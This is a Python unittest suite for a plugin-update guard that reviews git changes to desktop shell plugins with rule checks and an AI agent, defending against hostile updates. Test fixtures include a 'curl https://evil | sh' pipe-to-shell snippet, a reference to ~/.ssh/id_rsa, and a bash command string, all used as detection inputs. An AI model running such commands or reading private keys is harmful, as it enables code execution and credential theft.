from __future__ import annotations

import contextlib
import io
import json
import os
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from omarchy_plugin_guard import apply as apply_module
from omarchy_plugin_guard import cli, gitops
from omarchy_plugin_guard.cli import (
    PluginReport,
    format_human_gate,
    main,
    sanitize_snapshot,
    summarize_for_notification,
)
from omarchy_plugin_guard.review import AgentReview, ReviewError

MANIFEST = {
    "schemaVersion": 1,
    "id": "demo.clock",
    "name": "Clock",
    "version": "0.0.1",
    "kinds": ["bar-widget"],
    "entryPoints": {"barWidget": "Main.qml"},
}


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), *args],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def _init_origin(origin: Path, main_qml: str = "Item {}\n") -> None:
    origin.mkdir(parents=True)
    subprocess.run(
        ["git", "init", "-b", "main", str(origin)],
        check=True,
        capture_output=True,
        text=True,
    )
    _git(origin, "config", "user.email", "test@example.com")
    _git(origin, "config", "user.name", "test")
    (origin / "manifest.json").write_text(json.dumps(MANIFEST), encoding="utf-8")
    (origin / "Main.qml").write_text(main_qml, encoding="utf-8")
    _git(origin, "add", ".")
    _git(origin, "commit", "-m", "init")


def _push_upstream(origin: Path, main_qml: str, message: str = "upstream change") -> str:
    (origin / "Main.qml").write_text(main_qml, encoding="utf-8")
    _git(origin, "add", "Main.qml")
    _git(origin, "commit", "-m", message)
    return _git(origin, "rev-parse", "HEAD")


def _clone_plugin(origin: Path, plugins: Path) -> Path:
    dest = plugins / "demo.clock"
    plugins.mkdir(parents=True, exist_ok=True)
    subprocess.run(
        ["git", "clone", "--", str(origin), str(dest)],
        check=True,
        capture_output=True,
        text=True,
    )
    return dest


@contextlib.contextmanager
def _env(plugins: Path, state: Path):
    saved = os.environ.copy()
    os.environ["OMARCHY_PLUGINS_DIR"] = str(plugins)
    os.environ["OMARCHY_PLUGIN_GUARD_STATE_DIR"] = str(state)
    try:
        yield
    finally:
        os.environ.clear()
        os.environ.update(saved)


def _run(plugins: Path, state: Path, *argv: str) -> tuple[int, str, str]:
    stdout = io.StringIO()
    stderr = io.StringIO()
    with (
        _env(plugins, state),
        contextlib.redirect_stdout(stdout),
        contextlib.redirect_stderr(stderr),
    ):
        code = main(list(argv))
    return code, stdout.getvalue(), stderr.getvalue()


def _run_json(plugins: Path, state: Path, *argv: str) -> tuple[int, dict]:
    code, text, _ = _run(plugins, state, *argv, "--json")
    return code, json.loads(text)


def _fake_agent(verdict: str = "allow", **extra):
    def fake(**kwargs):
        return AgentReview(verdict=verdict, summary=f"fake {verdict}", findings=[], raw="{}", **extra)

    return fake


@contextlib.contextmanager
def _no_omarchy():
    """Skip `omarchy plugin validate` and the shell rescan, which need Omarchy."""
    with mock.patch.object(apply_module, "validate_plugin", lambda folder: None), mock.patch.object(
        apply_module, "rescan_plugins", lambda: None
    ):
        yield


class CliTests(unittest.TestCase):
    def test_help_exits_zero(self) -> None:
        with self.assertRaises(SystemExit) as ctx:
            main(["--help"])
        self.assertEqual(ctx.exception.code, 0)

    def test_auto_and_force_are_exclusive(self) -> None:
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit) as ctx:
            main(["update", "--auto", "--force"])
        self.assertEqual(ctx.exception.code, 2)

    def test_baseline_and_status_in_temp_dirs(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            plugins = root / "plugins"
            state = root / "state"
            plugin = plugins / "demo.clock"
            plugin.mkdir(parents=True)
            (plugin / "manifest.json").write_text(json.dumps(MANIFEST), encoding="utf-8")
            (plugin / "Main.qml").write_text("Item {}\n", encoding="utf-8")
            code, _, _ = _run(plugins, state, "baseline", "demo.clock", "--json")
            self.assertEqual(code, 0)
            baseline = state / "baselines" / "demo.clock.json"
            self.assertTrue(baseline.is_file())
            payload = json.loads(baseline.read_text(encoding="utf-8"))
            self.assertEqual(payload["plugin_id"], "demo.clock")
            self.assertEqual(payload["capabilities"]["kinds"], ["bar-widget"])
            self.assertEqual(payload["capabilities"]["command_lines"], [])


class DirtyTreeUpdateTests(unittest.TestCase):
    def test_dirty_tree_is_up_to_date_when_origin_has_no_new_commit(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin = root / "origin"
            plugins = root / "plugins"
            _init_origin(origin)
            plugin = _clone_plugin(origin, plugins)
            (plugin / "Main.qml").write_text("Item { /* local */ }\n", encoding="utf-8")

            code, payload = _run_json(plugins, root / "state", "update", "demo.clock", "--skip-agent")
            result = payload["results"][0]
            self.assertEqual(code, 0)
            self.assertEqual(result["status"], "up_to_date")
            self.assertNotIn("error", result)

    def test_local_commit_ahead_of_origin_is_not_an_update(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin = root / "origin"
            plugins = root / "plugins"
            _init_origin(origin)
            plugin = _clone_plugin(origin, plugins)
            _git(plugin, "config", "user.email", "test@example.com")
            _git(plugin, "config", "user.name", "test")
            (plugin / "Main.qml").write_text("Item { /* local fix */ }\n", encoding="utf-8")
            _git(plugin, "commit", "-am", "local fix")

            code, payload = _run_json(plugins, root / "state", "update", "demo.clock", "--skip-agent")
            result = payload["results"][0]
            self.assertEqual(code, 0)
            self.assertEqual(result["status"], "ahead")
            self.assertNotIn("verdict", result)
            self.assertIn("ahead of origin", result["reasons"][0])

    def test_dirty_tree_blocks_only_when_an_update_is_available(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin = root / "origin"
            plugins = root / "plugins"
            _init_origin(origin)
            plugin = _clone_plugin(origin, plugins)
            (plugin / "Main.qml").write_text("Item { /* local */ }\n", encoding="utf-8")
            new_sha = _push_upstream(origin, "Item { /* upstream */ }\n")

            code, payload = _run_json(plugins, root / "state", "update", "demo.clock", "--skip-agent")
            result = payload["results"][0]
            self.assertEqual(code, 1)
            self.assertEqual(result["status"], "blocked")
            self.assertEqual(result["to_sha"], new_sha)
            self.assertIn("update available", result["error"])
            self.assertTrue(
                any(reason.startswith("local: ") and "Main.qml" in reason for reason in result["reasons"])
            )
            self.assertTrue(any("upstream change" in reason for reason in result["reasons"]))

            text_code, text, _ = _run(plugins, root / "state", "update", "demo.clock", "--skip-agent")
            self.assertEqual(text_code, 1)
            self.assertIn("blocked", text)
            self.assertIn("update available", text)
            self.assertIn(new_sha[:8], text)
            self.assertIn("incoming", text)
            self.assertIn("upstream change", text)


class SharedFetchHeadTests(unittest.TestCase):
    """omaplug and `omarchy plugin update` fetch into the same checkouts."""

    def test_rival_fetch_emptying_fetch_head_does_not_break_review(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin = root / "origin"
            plugins = root / "plugins"
            _init_origin(origin)
            plugin = _clone_plugin(origin, plugins)
            new_sha = _push_upstream(origin, "Item { width: 6 }\n")
            real_git = gitops.git

            def git_with_rival_fetch(repo, *args, **kwargs):
                result = real_git(repo, *args, **kwargs)
                if args[:1] == ("fetch",):
                    # Another fetch has opened FETCH_HEAD and not yet refilled it.
                    (plugin / ".git" / "FETCH_HEAD").write_text("", encoding="utf-8")
                return result

            with mock.patch.object(gitops, "git", git_with_rival_fetch):
                code, payload = _run_json(plugins, root / "state", "review", "demo.clock", "--skip-agent")
            result = payload["results"][0]
            self.assertEqual(code, 0, result.get("error"))
            self.assertEqual(result["status"], "reviewed")
            self.assertEqual(result["to_sha"], new_sha)

    def test_fetch_leaves_fetch_head_to_other_tools(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin = root / "origin"
            plugins = root / "plugins"
            _init_origin(origin)
            plugin = _clone_plugin(origin, plugins)
            _push_upstream(origin, "Item { width: 7 }\n")

            _run_json(plugins, root / "state", "review", "demo.clock", "--skip-agent")
            self.assertFalse((plugin / ".git" / "FETCH_HEAD").exists())


class AgentOutcomeTests(unittest.TestCase):
    def _fixture(self, root: Path) -> tuple[Path, Path, Path]:
        origin = root / "origin"
        plugins = root / "plugins"
        state = root / "state"
        _init_origin(origin)
        _clone_plugin(origin, plugins)
        _run(plugins, state, "baseline", "demo.clock")
        return origin, plugins, state

    def test_agent_error_is_an_error_not_a_deny(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin, plugins, state = self._fixture(root)
            _push_upstream(origin, "Item { width: 2 }\n")

            def broken(**kwargs):
                raise ReviewError("claude exploded")

            with mock.patch.object(cli, "run_agent_review", broken):
                code, payload = _run_json(plugins, state, "update", "demo.clock", "--yes")
            result = payload["results"][0]
            self.assertEqual(code, 1)
            self.assertEqual(result["status"], "error")
            self.assertNotIn("verdict", result)
            self.assertIn("claude exploded", result["error"])
            head = _git(plugins / "demo.clock", "rev-parse", "HEAD")
            self.assertEqual(head, _git(origin, "rev-parse", "HEAD~1"))
            audit = (state / "audit.jsonl").read_text(encoding="utf-8").splitlines()
            self.assertEqual(json.loads(audit[-1])["event"], "error")

    def test_denied_tool_calls_need_human(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin, plugins, state = self._fixture(root)
            _push_upstream(origin, "Item { width: 3 }\n")
            with mock.patch.object(cli, "run_agent_review", _fake_agent("allow", denied_calls=1)):
                code, payload = _run_json(plugins, state, "review", "demo.clock")
            result = payload["results"][0]
            self.assertEqual(code, 0)
            self.assertEqual(result["verdict"], "needs-human")
            self.assertTrue(any("denied tool call" in reason for reason in result["reasons"]))

    def test_review_records_first_seen_and_audit(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin, plugins, state = self._fixture(root)
            new_sha = _push_upstream(origin, "Item { width: 4 }\n")
            with mock.patch.object(cli, "run_agent_review", _fake_agent("allow")):
                code, payload = _run_json(plugins, state, "review", "demo.clock")
            result = payload["results"][0]
            self.assertEqual(code, 0)
            self.assertEqual(result["status"], "reviewed")
            self.assertEqual(result["verdict"], "allow")
            self.assertEqual(result["diff_lines"], 2)
            self.assertFalse(result["diff_truncated"])
            seen = json.loads((state / "seen" / "demo.clock.json").read_text(encoding="utf-8"))
            self.assertEqual(seen["sha"], new_sha)
            self.assertTrue((state / "reviews" / "demo.clock.json").is_file())
            self.assertFalse((state / "workspace").exists())

    def test_block_already_installed_does_not_deny_an_unrelated_update(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin = root / "origin"
            plugins = root / "plugins"
            state = root / "state"
            comment = '// an icon "at" ~/.ssh/id_rsa is refused\n'
            _init_origin(origin, comment + "Item {}\n")
            _clone_plugin(origin, plugins)
            _run(plugins, state, "baseline", "demo.clock")
            _push_upstream(origin, comment + "Item { width: 6 }\n")
            with mock.patch.object(cli, "run_agent_review", _fake_agent("allow")):
                _, payload = _run_json(plugins, state, "review", "demo.clock")
            result = payload["results"][0]
            self.assertEqual(result["verdict"], "allow")
            credentials = [item for item in result["findings"] if item["rule"] == "credentials"]
            self.assertTrue(credentials)
            self.assertTrue(all(item["severity"] == "note" for item in credentials))

    def test_block_introduced_by_the_update_still_denies(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin, plugins, state = self._fixture(root)
            _push_upstream(origin, 'Item { property string k: "~/.ssh/id_rsa" }\n')
            with mock.patch.object(cli, "run_agent_review", _fake_agent("allow")):
                _, payload = _run_json(plugins, state, "review", "demo.clock")
            result = payload["results"][0]
            self.assertEqual(result["verdict"], "deny")
            self.assertIn("mechanical block finding", result["reasons"])


class AutoApplyTests(unittest.TestCase):
    def _fixture(self, root: Path, main_qml: str = "Item {}\n") -> tuple[Path, Path, Path]:
        origin = root / "origin"
        plugins = root / "plugins"
        state = root / "state"
        _init_origin(origin, main_qml)
        _clone_plugin(origin, plugins)
        _run(plugins, state, "baseline", "demo.clock")
        return origin, plugins, state

    def test_auto_defers_during_soak_then_applies(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin, plugins, state = self._fixture(root)
            new_sha = _push_upstream(origin, "Item { width: 5 }\n")
            with mock.patch.object(cli, "run_agent_review", _fake_agent("allow")), _no_omarchy():
                code, payload = _run_json(plugins, state, "update", "demo.clock", "--auto")
                result = payload["results"][0]
                self.assertEqual(code, 0)
                self.assertEqual(result["status"], "deferred")
                self.assertTrue(any(reason.startswith("soak:") for reason in result["policy"]))
                self.assertNotEqual(_git(plugins / "demo.clock", "rev-parse", "HEAD"), new_sha)

                code, payload = _run_json(
                    plugins, state, "update", "demo.clock", "--auto", "--soak-days", "0"
                )
                result = payload["results"][0]
                self.assertEqual(code, 0)
                self.assertEqual(result["status"], "applied")
                self.assertEqual(result["mode"], "auto")
                self.assertEqual(_git(plugins / "demo.clock", "rev-parse", "HEAD"), new_sha)
                self.assertFalse((state / "seen" / "demo.clock.json").exists())
                baseline = json.loads((state / "baselines" / "demo.clock.json").read_text(encoding="utf-8"))
                self.assertEqual(baseline["commit"], new_sha)
                events = [json.loads(line)["event"] for line in (state / "audit.jsonl").read_text().splitlines()]
                self.assertEqual(events[-2:], ["deferred", "applied"])

    def test_auto_never_applies_plugins_that_run_commands(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            shell = 'import Quickshell.Io\nProcess { command: ["bash", "-c", "date"] }\n'
            origin, plugins, state = self._fixture(root, shell)
            _push_upstream(origin, shell.replace("Process {", "Process { id: p; "))
            with mock.patch.object(cli, "run_agent_review", _fake_agent("allow")), _no_omarchy():
                code, payload = _run_json(
                    plugins, state, "update", "demo.clock", "--auto", "--soak-days", "0"
                )
            result = payload["results"][0]
            self.assertEqual(code, 0)
            self.assertEqual(result["status"], "deferred")
            self.assertTrue(any("runs commands" in reason for reason in result["policy"]))

    def test_auto_leaves_needs_human_alone(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            origin, plugins, state = self._fixture(root)
            _push_upstream(origin, 'Item { Process { command: ["date"] } }\n')
            with mock.patch.object(cli, "run_agent_review", _fake_agent("allow")), _no_omarchy():
                code, payload = _run_json(
                    plugins, state, "update", "demo.clock", "--auto", "--soak-days", "0"
                )
            result = payload["results"][0]
            self.assertEqual(code, 0)
            self.assertEqual(result["status"], "reviewed")
            self.assertEqual(result["verdict"], "needs-human")
            self.assertNotIn("policy", result)

    def test_changed_bash_string_is_needs_human_even_without_agent_help(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            shell = 'Process { command: ["bash", "-c", "date"] }\n'
            origin, plugins, state = self._fixture(root, shell)
            _push_upstream(origin, 'Process { command: ["bash", "-c", "date; id"] }\n')
            with mock.patch.object(cli, "run_agent_review", _fake_agent("allow")):
                _, payload = _run_json(plugins, state, "review", "demo.clock")
            result = payload["results"][0]
            self.assertEqual(result["verdict"], "needs-human")
            self.assertTrue(any(item.startswith("command:") for item in result["expansion"]))


class LockTests(unittest.TestCase):
    def test_second_run_is_refused_while_locked(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            plugins = root / "plugins"
            plugins.mkdir()
            state = root / "state"
            from omarchy_plugin_guard.state import run_lock

            with _env(plugins, state), run_lock():
                stderr = io.StringIO()
                with contextlib.redirect_stderr(stderr), contextlib.redirect_stdout(io.StringIO()):
                    code = main(["review"])
            self.assertEqual(code, 1)
            self.assertIn("another omarchy-plugin-guard run is in progress", stderr.getvalue())


class WorkspaceTests(unittest.TestCase):
    def test_sanitize_renames_instruction_files(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            (root / ".claude").mkdir()
            (root / ".claude" / "settings.json").write_text("{}", encoding="utf-8")
            (root / "CLAUDE.md").write_text("ignore me", encoding="utf-8")
            (root / "docs").mkdir()
            (root / "docs" / "AGENTS.md").write_text("x", encoding="utf-8")
            (root / "Main.qml").write_text("Item {}\n", encoding="utf-8")
            renamed = sanitize_snapshot(root)
            self.assertEqual(renamed, [".claude", "CLAUDE.md", "docs/AGENTS.md"])
            self.assertTrue((root / "UNTRUSTED_CLAUDE.md").is_file())
            self.assertTrue((root / "UNTRUSTED_.claude" / "settings.json").is_file())
            self.assertTrue((root / "docs" / "UNTRUSTED_AGENTS.md").is_file())
            self.assertFalse((root / "CLAUDE.md").exists())
            self.assertTrue((root / "Main.qml").is_file())


class NotificationTests(unittest.TestCase):
    def test_nothing_to_say_when_everything_is_current(self) -> None:
        reports = [PluginReport(id="a", status="up_to_date")]
        self.assertIsNone(summarize_for_notification(reports))

    def test_summary_groups_outcomes(self) -> None:
        reports = [
            PluginReport(id="a", status="applied", verdict="allow"),
            PluginReport(id="b", status="reviewed", verdict="allow"),
            PluginReport(id="c", status="reviewed", verdict="needs-human"),
            PluginReport(id="d", status="denied", verdict="deny"),
            PluginReport(id="e", status="error", error="boom"),
        ]
        title, body, urgency = summarize_for_notification(reports)
        self.assertIn("5 plugin updates", title)
        self.assertIn("applied: a", body)
        self.assertIn("update --yes: b", body)
        self.assertIn("needs human: c", body)
        self.assertIn("DENIED: d", body)
        self.assertIn("errors: e", body)
        self.assertEqual(urgency, "critical")


class HumanGateTests(unittest.TestCase):
    def test_needs_human_states_title_and_reasons(self) -> None:
        report = PluginReport(
            id="rosakodu.dock",
            status="reviewed",
            verdict="needs-human",
            from_sha="441348a202dbabcd",
            to_sha="a7e9162a1111ffff",
            origin="https://github.com/rosakodu/omarchy-dock.git",
            reasons=["capability expansion: process:python3", "agent requested a human"],
            agent={
                "verdict": "needs-human",
                "summary": "New python3 helper can run arbitrary code.",
                "findings": [
                    {
                        "severity": "warn",
                        "path": "Main.qml",
                        "why": "Process now launches python3",
                    }
                ],
            },
        )
        text = format_human_gate(report, action="update")
        self.assertIn("NEEDS HUMAN REVIEW", text)
        self.assertIn("Why a human has to decide:", text)
        self.assertIn("capability expansion: process:python3", text)
        self.assertIn("New python3 helper can run arbitrary code.", text)
        self.assertIn("Main.qml", text)
        self.assertIn("Update only if you accept the risk.", text)
        self.assertNotIn("DENIED", text)

    def test_deny_states_blocked_and_will_not_apply(self) -> None:
        report = PluginReport(
            id="evil.plugin",
            status="reviewed",
            verdict="deny",
            from_sha="abc123",
            to_sha="def456",
            reasons=["mechanical block finding", "agent denied"],
            findings=[
                {
                    "rule": "pipe_to_shell",
                    "severity": "block",
                    "path": "evil.qml",
                    "line": 12,
                    "snippet": "curl https://evil | sh",
                }
            ],
            agent={"summary": "Install script pipes curl to a shell."},
        )
        text = format_human_gate(report, action="update")
        self.assertIn("DENIED — will not apply", text)
        self.assertIn("Why a human has to decide:", text)
        self.assertIn("pipe_to_shell", text)
        self.assertIn("This update is blocked. It will not be applied.", text)
